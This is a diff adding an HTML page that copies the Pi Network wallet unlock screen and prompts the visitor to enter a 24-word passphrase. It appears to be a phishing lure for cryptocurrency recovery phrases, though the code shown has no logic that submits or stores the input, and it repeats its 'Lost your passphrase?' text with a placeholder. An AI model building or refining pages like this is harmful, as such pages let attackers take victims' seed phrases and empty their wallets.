@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Unlock Page</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    .purple-bar {
+      background-color: #713d92;
+      color: white;
+      padding: 10px;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      background-color: white;
+      padding: 20px;
+    }
+
+    textarea[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 2px;
+      box-sizing: border-box;
+      resize: none;
+    }
+
+    .button-container {
+      text-align: center;
+    }
+
+    .button-container button {
+      width: 100%;
+      /* Make buttons as wide as the text box */
+      padding: 10px;
+      margin-bottom: 10px;
+      border-radius: 10px;
+      cursor: pointer;
+      display: block;
+    }
+
+    .purple-button {
+      background-color: #713d92;
+      color: white;
+      border: none;
+      font-weight: bold;
+    }
+
+    .white-button {
+      background-color: white;
+      color: purple;
+      border: 1px solid #713d92;
+    }
+
+    .wallet-image {
+      width: 20px;
+      height: auto;
+      margin-right: 10px;
+      margin-left: 10px;
+    }
+
+    .wallet-text {
+      font-weight: bold;
+    }
+
+    .bottom-text {
+      margin-top: 20px;
+      text-align: left;
+      color: #3e3e3e;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="purple-bar">
+    <span class="wallet-text">Wallet</span>
+    <!-- Update the src attribute to the correct location -->
+    <img src="./image.png" alt="w" class="wallet-image">
+  </div>
+  <div class="container">
+    <h3 style="text-align: center;">Unlock pi wallet</h3>
+    <!-- Set rows attribute to 7 for a 7-line input -->
+    <textarea type="text" placeholder="Enter your 24-word passphrase here" rows=7></textarea>
+    <div class="button-container">
+      <!-- Wrap buttons in a div for styling -->
+      <div>
+        <!--<button class="white-button">Cancel</button>-->
+        <button class="purple-button">Unlock With Passphrase</button>
+      </div>
+    </div>
+    <p class="bottom-text">
+      Lost your passphrase? You can create a new wallet, but all your
+      &#960; in your previous wallet will be inaccessible.
+    </p>
+    <p class="bottom-text">
+      Lost your passphrase? <span style="color: #5b94bb;">You can create a new wallet,</span> but all your
+      (pi unicode) in your previous wallet will be inaccessible.
+    </p>
+  </div>
+</body>
+
+</html>
